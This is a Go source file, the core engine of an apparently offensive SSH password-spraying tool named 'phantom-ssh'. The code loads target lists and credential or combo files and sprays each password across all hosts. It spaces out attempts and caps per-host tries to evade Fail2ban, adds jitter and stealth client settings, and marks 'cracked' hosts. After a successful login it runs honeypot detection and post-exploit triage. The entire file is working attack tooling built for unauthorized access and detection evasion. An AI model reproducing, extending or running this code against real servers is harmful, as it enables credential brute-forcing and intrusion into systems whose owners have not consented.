package engine

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"phantom-ssh/pkg/evasion"
	"phantom-ssh/pkg/honeypot"
	"phantom-ssh/pkg/stealth"
	"phantom-ssh/pkg/triage"

	"golang.org/x/crypto/ssh"
)

// Task represents a single probe
type Task struct {
	Target   string
	Username string
	Password string
}

// Config holds all runtime options
type Config struct {
	TargetFile      string
	Targets         []string
	UserFile        string
	PassFile        string
	ComboFile       string
	SingleUser      string
	SinglePass      string
	Workers         int
	Timeout         time.Duration
	MaxTriesPerHost int
	Interleave      bool
	CanaryCheck     bool
	AutoTriage      bool
	MaxJitterMs     int
	OutputDir       string
	ResumeFile      string
	ClientVersion   string
}

// Stats holds atomic metrics for live monitoring
type Stats struct {
	TotalTasks     int64
	SentTasks      int64
	CompletedTasks int64
	Goods          int64
	Honeypots      int64
	Errors         int64
	SkippedF2B     int64
	StartTime      time.Time
}

// HitCallback is invoked when a valid hit or honeypot is discovered
type HitCallback func(target, user, pass string, isHoneypot bool, probe *honeypot.ShellProbeResult, rtt time.Duration)

// Engine manages the spray execution pipeline
type Engine struct {
	cfg             *Config
	stats           *Stats
	tracker         *evasion.AttemptTracker
	writer          *triage.ResultWriter
	successfulHosts sync.Map
	onHit           HitCallback
	ctx             context.Context
	cancel          context.CancelFunc
}

// NewEngine creates a new spray engine
func NewEngine(cfg *Config, onHit HitCallback) (*Engine, error) {
	writer, err := triage.NewResultWriter(cfg.OutputDir)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize output directory: %w", err)
	}

	ctx, cancel := context.WithCancel(context.Background())

	return &Engine{
		cfg:     cfg,
		stats:   &Stats{StartTime: time.Now()},
		tracker: evasion.NewAttemptTracker(cfg.MaxTriesPerHost),
		writer:  writer,
		onHit:   onHit,
		ctx:     ctx,
		cancel:  cancel,
	}, nil
}

// Stop gracefully signals the engine to stop
func (e *Engine) Stop() {
	e.cancel()
}

// LoadTargets loads and normalizes targets from file or list
func LoadTargets(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Normalize IP:PORT
		if !strings.Contains(line, ":") {
			line = line + ":22"
		}
		targets = append(targets, line)
	}

	return targets, scanner.Err()
}

// CredentialPair holds username and password
type CredentialPair struct {
	User string
	Pass string
}

// LoadCredentials builds the credential list based on flags
func LoadCredentials(userFile, passFile, comboFile, singleUser, singlePass string) ([]CredentialPair, error) {
	var creds []CredentialPair

	// 1. Single creds
	if singleUser != "" && singlePass != "" {
		return []CredentialPair{{User: singleUser, Pass: singlePass}}, nil
	}

	// 2. Combo file
	if comboFile != "" {
		file, err := os.Open(comboFile)
		if err != nil {
			return nil, err
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			var u, p string
			if strings.Contains(line, ":") {
				parts := strings.SplitN(line, ":", 2)
				u = strings.TrimSpace(parts[0])
				p = strings.TrimSpace(parts[1])
			} else if strings.Contains(line, " ") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					u = parts[0]
					p = parts[1]
				}
			}
			if u != "" {
				creds = append(creds, CredentialPair{User: u, Pass: p})
			}
		}
		return creds, scanner.Err()
	}

	// 3. User & Pass files
	var users []string
	if userFile != "" {
		f, err := os.Open(userFile)
		if err != nil {
			return nil, err
		}
		s := bufio.NewScanner(f)
		for s.Scan() {
			u := strings.TrimSpace(s.Text())
			if u != "" && !strings.HasPrefix(u, "#") {
				users = append(users, u)
			}
		}
		_ = f.Close()
	} else if singleUser != "" {
		users = append(users, singleUser)
	}

	var passes []string
	if passFile != "" {
		f, err := os.Open(passFile)
		if err != nil {
			return nil, err
		}
		s := bufio.NewScanner(f)
		for s.Scan() {
			p := strings.TrimSpace(s.Text())
			if p != "" && !strings.HasPrefix(p, "#") {
				passes = append(passes, p)
			}
		}
		_ = f.Close()
	} else if singlePass != "" {
		passes = append(passes, singlePass)
	}

	for _, u := range users {
		for _, p := range passes {
			creds = append(creds, CredentialPair{User: u, Pass: p})
		}
	}

	return creds, nil
}

// Run executes the spray with workers, F2B evasion, and triage
func (e *Engine) Run(targets []string, creds []CredentialPair) error {
	if len(targets) == 0 {
		return fmt.Errorf("no targets loaded")
	}
	if len(creds) == 0 {
		return fmt.Errorf("no credentials loaded")
	}

	// If Interleaving is enabled, shuffle targets across distinct /24 subnets
	processedTargets := targets
	if e.cfg.Interleave {
		processedTargets = evasion.InterleaveTargets(targets)
	}

	totalTasks := int64(len(processedTargets) * len(creds))
	atomic.StoreInt64(&e.stats.TotalTasks, totalTasks)

	taskChan := make(chan Task, e.cfg.Workers*2)
	var wg sync.WaitGroup

	// Launch worker pool
	for i := 0; i < e.cfg.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			e.worker(taskChan)
		}(i)
	}

	// Scheduler: Spray horizontally (Cred 1 across all targets, then Cred 2 across all targets)
	// This ensures maximum time delta between repeated attempts on any single host!
	go func() {
		defer close(taskChan)

		for _, cred := range creds {
			for _, target := range processedTargets {
				select {
				case <-e.ctx.Done():
					return
				default:
				}

				host, _, _ := net.SplitHostPort(target)
				if host == "" {
					host = target
				}

				// Check if host already cracked
				if _, ok := e.successfulHosts.Load(target); ok {
					atomic.AddInt64(&e.stats.CompletedTasks, 1)
					continue
				}

				// Check Fail2ban attempt threshold
				if !e.tracker.CanAttempt(host) {
					atomic.AddInt64(&e.stats.SkippedF2B, 1)
					atomic.AddInt64(&e.stats.CompletedTasks, 1)
					continue
				}

				atomic.AddInt64(&e.stats.SentTasks, 1)
				taskChan <- Task{
					Target:   target,
					Username: cred.User,
					Password: cred.Pass,
				}
			}
		}
	}()

	wg.Wait()
	return nil
}

// worker processes tasks from channel
func (e *Engine) worker(tasks <-chan Task) {
	for {
		select {
		case <-e.ctx.Done():
			return
		case task, ok := <-tasks:
			if !ok {
				return
			}
			e.processTask(task)
		}
	}
}

// processTask attempts authentication and post-exploit triage
func (e *Engine) processTask(task Task) {
	defer atomic.AddInt64(&e.stats.CompletedTasks, 1)

	// Apply micro-jitter if configured
	evasion.ApplyJitter(e.cfg.MaxJitterMs)

	// Build stealth client configuration
	clientConfig := stealth.BuildClientConfig(
		task.Username,
		task.Password,
		e.cfg.ClientVersion,
		e.cfg.Timeout,
	)

	start := time.Now()

	// Dial with strict deadline to neutralize SSH tarpits
	conn, err := stealth.DialWithTimeout("tcp", task.Target, e.cfg.Timeout)
	if err != nil {
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}
	defer conn.Close()

	// Perform SSH client handshake
	sshConn, chans, reqs, err := ssh.NewClientConn(conn, task.Target, clientConfig)
	if err != nil {
		atomic.AddInt64(&e.stats.Errors, 1)
		return
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	rtt := time.Since(start)

	// --- AUTHENTICATION SUCCESSFUL ---

	// Mark host as cracked to prevent redundant spraying
	e.successfulHosts.Store(task.Target, true)
	e.tracker.RecordSuccess(task.Target)

	serverBanner := string(sshConn.ServerVersion())

	// Tier 1 & 2: Honeypot checks
	var canaryAccepted bool
	if e.cfg.CanaryCheck {
		canaryAccepted = honeypot.CheckCanaryAuth(task.Target, e.cfg.Timeout)
	}

	var probe *honeypot.ShellProbeResult
	if e.cfg.AutoTriage {
		probe, _ = honeypot.ExecuteVerificationPipeline(client, e.cfg.Timeout)
	}

	// Final Honeypot Evaluation
	verdict := honeypot.EvaluateHoneypot(task.Target, serverBanner, probe, canaryAccepted)

	if verdict.IsHoneypot {
		atomic.AddInt64(&e.stats.Honeypots, 1)
		e.writer.RecordHoneypot(task.Target, task.Username, task.Password, verdict)
		if e.onHit != nil {
			e.onHit(task.Target, task.Username, task.Password, true, probe, rtt)
		}
	} else {
		atomic.AddInt64(&e.stats.Goods, 1)
		e.writer.RecordGood(task.Target, task.Username, task.Password, probe, rtt)
		if e.onHit != nil {
			e.onHit(task.Target, task.Username, task.Password, false, probe, rtt)
		}
	}
}

// GetStats returns current progress stats
func (e *Engine) GetStats() Stats {
	return Stats{
		TotalTasks:     atomic.LoadInt64(&e.stats.TotalTasks),
		SentTasks:      atomic.LoadInt64(&e.stats.SentTasks),
		CompletedTasks: atomic.LoadInt64(&e.stats.CompletedTasks),
		Goods:          atomic.LoadInt64(&e.stats.Goods),
		Honeypots:      atomic.LoadInt64(&e.stats.Honeypots),
		Errors:         atomic.LoadInt64(&e.stats.Errors),
		SkippedF2B:     atomic.LoadInt64(&e.stats.SkippedF2B),
		StartTime:      e.stats.StartTime,
	}
}

// SaveState saves progress state to json file
func (e *Engine) SaveState(filePath string) error {
	st := e.GetStats()
	data, err := json.MarshalIndent(st, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filePath, data, 0644)
}
